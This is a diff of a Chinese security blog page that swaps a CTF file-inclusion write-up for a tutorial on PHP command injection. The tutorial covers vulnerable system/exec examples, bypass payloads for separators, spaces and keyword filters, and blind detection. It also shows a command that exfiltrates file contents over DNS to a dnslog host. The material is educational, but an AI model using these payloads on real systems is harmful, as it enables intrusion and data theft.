@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="CTF,文件包含,目录遍历," />
+  <meta name="keywords" content="rce," />
 
 
 
@@ -79,25 +79,30 @@
 
 
 
-<meta name="description" content="西湖论剑的题目 前些天没有做 今天西湖论剑的题目重新放了出来 可以复现了 故来做一下web题目 题目质量较高">
-<meta name="keywords" content="CTF,文件包含,目录遍历">
+<meta name="description" content="命令执行漏洞的成因是，由于没有针对代码中可执行的特殊函数入口做过滤，导致用户可以提交恶意语句，并提交服务器执行。">
+<meta name="keywords" content="rce">
 <meta property="og:type" content="article">
-<meta property="og:title" content="西湖论剑web 3题 解析">
-<meta property="og:url" content="http://yoursite.com/2019/04/11/西湖论剑web-3题-解析/index.html">
+<meta property="og:title" content="命令执行漏洞整理">
+<meta property="og:url" content="http://yoursite.com/2020/02/08/命令执行漏洞整理/index.html">
 <meta property="og:site_name" content="Sch0lar&#39;s Blog">
-<meta property="og:description" content="西湖论剑的题目 前些天没有做 今天西湖论剑的题目重新放了出来 可以复现了 故来做一下web题目 题目质量较高">
+<meta property="og:description" content="命令执行漏洞的成因是，由于没有针对代码中可执行的特殊函数入口做过滤，导致用户可以提交恶意语句，并提交服务器执行。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.loli.net/2019/04/11/5caf00c571680.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/04/11/5caf012737d97.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/04/11/5caf025fce103.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/04/11/5caf03a35ecf1.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/04/11/5caf2a25e9eb1.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/04/11/5caf2b5ea7cc7.jpg">
-<meta property="og:updated_time" content="2019-04-11T12:04:22.000Z">
+<meta property="og:image" content="https://i.loli.net/2020/02/08/ziGaPJYbOL52U7N.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/08/OY5xpahKSbV4T8E.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/08/命令执行漏洞整理/imgs/1581146705490.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/08/GqIWdfzeCK4bolF.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/08/zmWCqdPSxNXf5vZ.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/08/YNC3swOLeXTEAgQ.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/08/q7ukZA5iTmPjCLx.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/08/命令执行漏洞整理/imgs/risfIC8glTWBLcu.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/10/4pNKlSX6Ls5QTxj.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/02/08/wLl7ZIpSE29ihev.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/08/命令执行漏洞整理/imgs/1581170146264.png">
+<meta property="og:updated_time" content="2020-02-10T08:27:48.167Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="西湖论剑web 3题 解析">
-<meta name="twitter:description" content="西湖论剑的题目 前些天没有做 今天西湖论剑的题目重新放了出来 可以复现了 故来做一下web题目 题目质量较高">
-<meta name="twitter:image" content="https://i.loli.net/2019/04/11/5caf00c571680.jpg">
+<meta name="twitter:title" content="命令执行漏洞整理">
+<meta name="twitter:description" content="命令执行漏洞的成因是，由于没有针对代码中可执行的特殊函数入口做过滤，导致用户可以提交恶意语句，并提交服务器执行。">
+<meta name="twitter:image" content="https://i.loli.net/2020/02/08/ziGaPJYbOL52U7N.png">
 
 
 
@@ -127,13 +132,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/11/西湖论剑web-3题-解析/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/02/08/命令执行漏洞整理/"/>
 
 
 
 
 
-  <title>西湖论剑web 3题 解析 | Sch0lar's Blog</title>
+  <title>命令执行漏洞整理 | Sch0lar's Blog</title>
   
 
 
@@ -310,7 +315,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/11/西湖论剑web-3题-解析/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/08/命令执行漏洞整理/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Sch0lar">
@@ -327,7 +332,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">西湖论剑web 3题 解析</h1>
+          <h1 class="post-title" itemprop="name headline">命令执行漏洞整理</h1>
         
 
         <div class="post-meta">
@@ -339,8 +344,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-11T16:41:36+08:00">
-                2019-04-11
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-08T14:15:59+08:00">
+                2020-02-08
               </time>
             
 
@@ -362,8 +367,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
                   </a>
                 </span>
 
@@ -399,38 +404,53 @@
       
 
       
-        <p>西湖论剑的题目 前些天没有做 今天西湖论剑的题目重新放了出来 可以复现了</p>
-<p>故来做一下web题目 题目质量较高</p>
-<p><img src="https://i.loli.net/2019/04/11/5caf00c571680.jpg" alt="Xnip2019-04-11_16-54-10.jpg"></p>
+        <p>命令执行漏洞的成因是，由于没有针对代码中可执行的特殊函数入口做过滤，导致用户可以提交恶意语句，并提交服务器执行。</p>
 <a id="more"></a>
-<h2 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h2><p><img src="https://i.loli.net/2019/04/11/5caf012737d97.jpg" alt="Xnip2019-04-11_16-55-57.jpg"></p>
-<p>打开题目连接 看到一个类似博客界面 都不是重点 重点是看到了</p>
-<p><code>include $_GET[&#39;file&#39;]</code></p>
-<p>看到这突然想到题目考查的应该是文件包含相关知识</p>
-<p>故试一下</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">61.164</span><span class="number">.47</span><span class="number">.198</span>:<span class="number">10000</span>/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/04/11/5caf025fce103.jpg" alt="Xnip2019-04-11_17-01-08.jpg"></p>
-<p>两端base64加密的内容 第一段为index.php加密后的内容</p>
-<p>base解密后为</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!$a) &#123;</span></span><br><span class="line"><span class="php">	$a = <span class="string">'./templates/index.html'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strpos(<span class="string">'flag'</span>,$a)!==<span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">die</span>(<span class="string">'nonono'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> $a;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--hint: ZGlyLnBocA== --&gt;</span></span><br></pre></td></tr></table></figure>
-<p>貌似用处不大 不过第二段的<code>&lt;!--hint: ZGlyLnBocA== --&gt;</code></p>
-<p>解密后为<code>dir.php</code></p>
-<p>访问一下</p>
-<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//61.164.47.198:10000/dir.php</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/04/11/5caf03a35ecf1.jpg" alt="Xnip2019-04-11_17-06-33.jpg"></p>
-<p>接下来利用文件包含 包含<code>dir.php</code>这个文件。</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">61.164</span><span class="number">.47</span><span class="number">.198</span>:<span class="number">10000</span>/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure>
-<p>base64解密后得到 <code>dir.php</code>源码</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'dir'</span>]; <span class="comment">//dir通过接收数据并复制给变量a</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$a)&#123; </span></span><br><span class="line"><span class="php">$a = <span class="string">'/tmp'</span>;	<span class="comment">//默认a的路径</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">var_dump(scandir($a)); <span class="comment">//列出指定路径中的文件和目录</span></span></span><br></pre></td></tr></table></figure>
-<p>也就是说dir.php可以读取你输入的目录并展示目录下的所有文件</p>
-<p>自己想的是 如果我输入某目录 就会展示出目录下所有文件 文件夹名 之后我是不是可以利用文件包含 读取任意文件的内容呢？？</p>
-<p>经过测试 发现<code>ffffflag_is_Her4</code>文件</p>
-<p>估计flag在文件内</p>
-<p><img src="https://i.loli.net/2019/04/11/5caf2a25e9eb1.jpg" alt="Xnip2019-04-11_17-18-01.jpg"></p>
-<p>利用文件包含读取内容</p>
-<p><img src="https://i.loli.net/2019/04/11/5caf2b5ea7cc7.jpg" alt="Xnip2019-04-11_17-20-24.jpg"></p>
-<p>果然发现flag</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;8dc25fd21c52958f777ce92409e2802a&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure>
+<h2 id="命令执行相关函数"><a href="#命令执行相关函数" class="headerlink" title="命令执行相关函数"></a>命令执行相关函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $c = $_GET[<span class="string">'c'</span>];</span></span><br><span class="line"><span class="php">    system($c);</span></span><br><span class="line"><span class="php">?</span></span><br></pre></td></tr></table></figure>
+<p>c变量是可控的 这就造成了命令执行。system执行后结果会返回到页面。</p>
+<p><img src="https://i.loli.net/2020/02/08/ziGaPJYbOL52U7N.png" alt="QQ截图20200208143134.png"></p>
+<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h3><p>和system函数类似</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    $c = $_GET[<span class="string">'c'</span>];</span></span><br><span class="line"><span class="php">    passthru($c);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>exec也可造成命令执行 但和前两个函数不同的是他不会直接将结果返回到页面 需要打印。</p>
+<p><strong>string exec (string command, array &amp;output, int &amp;return_var)</strong><br><strong>command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值</strong></p>
+<p><img src="https://i.loli.net/2020/02/08/OY5xpahKSbV4T8E.png" alt="QQ截图20200208143854.png"></p>
+<p>打印<code>$b</code>的目的是获取每一行字符串。</p>
+<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $c = $_GET[<span class="string">'c'</span>];</span></span><br><span class="line"><span class="php">    var_dump(shell_exec($c));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>本身也是不可以回显需要打印。</p>
+<h3 id="反引号造成的命令执行"><a href="#反引号造成的命令执行" class="headerlink" title="反引号造成的命令执行"></a>反引号造成的命令执行</h3><p>另外补充一点就是 如果可控变量在反引号内 那么也可造成命令执行。只不过一般项目里会肥肠少见。。。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $c = $_GET[<span class="string">'c'</span>];</span></span><br><span class="line"><span class="php">    var_dump(`$c`);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h2 id="命令执行的绕过"><a href="#命令执行的绕过" class="headerlink" title="命令执行的绕过"></a>命令执行的绕过</h2><h3 id="规定执行代码"><a href="#规定执行代码" class="headerlink" title="规定执行代码"></a>规定执行代码</h3><p>例如有这样一种情况</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    $c = $_GET[<span class="string">'c'</span>];</span></span><br><span class="line"><span class="php">    $rce = <span class="string">"echo 123"</span>;</span></span><br><span class="line"><span class="php">    system($rce.$c);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/08/命令执行漏洞整理/imgs/1581146705490.png" alt="1581146705490"></p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这里绕过方法不止一种</span><br><span class="line">c=1%0awhoami	换行绕过</span><br><span class="line">c=1;whoami		利用分号绕过</span><br><span class="line">c=1|whoami		管道符绕过</span><br></pre></td></tr></table></figure>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>有些时候 我们执行命令 如 <code>cat flag.txt</code> 中间必须要有空格才可打开此文件读到内容。但是如果空格被过滤我们就应该用一些字符来替代空格</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;	可替代空格</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;IFS&#125;	可替代空格</span></span><br><span class="line"><span class="meta">%</span><span class="bash">09	(url传递可替代空格)</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/02/08/GqIWdfzeCK4bolF.png" alt="QQ截图20200208153511.png"></p>
+<h3 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h3><p>记得年底的时候貌似坐过一道命令执行相关的ctf过滤了关键字</p>
+<p>这里题目记不太清了 简单写个思路</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=l;b=s;$a$b	<span class="comment">//大家都知道。。。</span></span><br><span class="line"><span class="comment">//利用base64加密解密 </span></span><br><span class="line"><span class="string">`echo d2hvYW1p|base64 -d`</span>	<span class="comment">//linux下执行输出whoami命令 注意加反引号</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/02/08/zmWCqdPSxNXf5vZ.png" alt="QQ截图20200208154359.png"></p>
+<h2 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">无回显情况如何判断 命令是否执行?</span><br><span class="line">延时</span><br><span class="line"><span class="keyword">http</span>请求</span><br><span class="line">dns请求</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/02/08/YNC3swOLeXTEAgQ.png" alt="QQ图片20200208195321.png"></p>
+<p>例如这种 没有打印次函数不会显示结果的。那么我们如何去判断 有没有带入命令呢 这时候我们来加一个延时 思路有点类似于盲注?</p>
+<p><img src="https://i.loli.net/2020/02/08/q7ukZA5iTmPjCLx.png" alt="QQ图片20200208195518.png"></p>
+<p>管道符加sleep可以明显感觉到 网页刷新慢了三秒钟 即可判断存在无回显命令执行。</p>
+<p>如果是可通讯状态下 可以利用这个点发起一个http请求到自己的vps 然后vps进行监听 </p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv <span class="number">8080</span></span><br></pre></td></tr></table></figure>
+<p>收到请求则证明存在命令执行。</p>
+<h3 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h3><p>请求内容换成 从服务器读取的数据 之后可以看到从dnslog上看到请求结果</p>
+<p><img src="/2020/02/08/命令执行漏洞整理/imgs/risfIC8glTWBLcu.png" alt="QQ图片20200208195518.png"></p>
+<p>你可能会问 为什么不直接<code>flag.txt</code>……..</p>
+<p>脑子不好用 把PHP写成了 txt 只是个例子  自己把它当成flag.php就好了</p>
+<p><img src="https://i.loli.net/2020/02/10/4pNKlSX6Ls5QTxj.jpg" alt="QQ图片20200210153040.jpg"></p>
+<p>ping的话发送的是dns请求那么dnslog肯定是可以用的</p>
+<p><img src="https://i.loli.net/2020/02/08/wLl7ZIpSE29ihev.png" alt="QQ图片20200208215236.png"></p>
+<p>请求内容里不能包含空格 我们在请求dnslog的时候应该替换一下</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping<span class="built_in"> aaa </span>bbb.dns.log 因为这样是不可以ping的 地址不应该包含空格</span><br></pre></td></tr></table></figure>
+<p>这里将空格替换成666</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`cat flag.txt|sed s/<span class="string">[[:space:]]</span>/<span class="number">666</span>/`.test.dnslog.link</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/08/命令执行漏洞整理/imgs/1581170146264.png" alt="1581170146264"></p>
+<p>访问一下拿到了flag。</p>
 
       
     </div>
@@ -448,11 +468,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
-          
-            <a href="/tags/文件包含/" rel="tag"><i class="fa fa-tag"></i> 文件包含</a>
-          
-            <a href="/tags/目录遍历/" rel="tag"><i class="fa fa-tag"></i> 目录遍历</a>
+            <a href="/tags/rce/" rel="tag"><i class="fa fa-tag"></i> rce</a>
           
         </div>
       
@@ -465,8 +481,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/01/南邮CG-CTF/" rel="next" title="南邮CG-CTF">
-                <i class="fa fa-chevron-left"></i> 南邮CG-CTF
+              <a href="/2019/12/24/无字母数字webshell/" rel="next" title="无字母数字webshell">
+                <i class="fa fa-chevron-left"></i> 无字母数字webshell
               </a>
             
           </div>
@@ -474,10 +490,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/28/up/" rel="prev" title="Upload-Labs wp">
-                Upload-Labs wp <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -661,7 +673,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyt3"><span class="nav-number">1.</span> <span class="nav-text">babyt3</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行相关函数"><span class="nav-number">1.</span> <span class="nav-text">命令执行相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#system"><span class="nav-number">1.1.</span> <span class="nav-text">system</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#passthru"><span class="nav-number">1.2.</span> <span class="nav-text">passthru</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exec"><span class="nav-number">1.3.</span> <span class="nav-text">exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell-exec"><span class="nav-number">1.4.</span> <span class="nav-text">shell_exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反引号造成的命令执行"><span class="nav-number">1.5.</span> <span class="nav-text">反引号造成的命令执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行的绕过"><span class="nav-number">2.</span> <span class="nav-text">命令执行的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#规定执行代码"><span class="nav-number">2.1.</span> <span class="nav-text">规定执行代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤空格"><span class="nav-number">2.2.</span> <span class="nav-text">过滤空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关键字过滤绕过"><span class="nav-number">2.3.</span> <span class="nav-text">关键字过滤绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无回显命令执行"><span class="nav-number">3.</span> <span class="nav-text">无回显命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dnslog"><span class="nav-number">3.1.</span> <span class="nav-text">dnslog</span></a></li></ol></li></ol></div>
             
 
           </div>
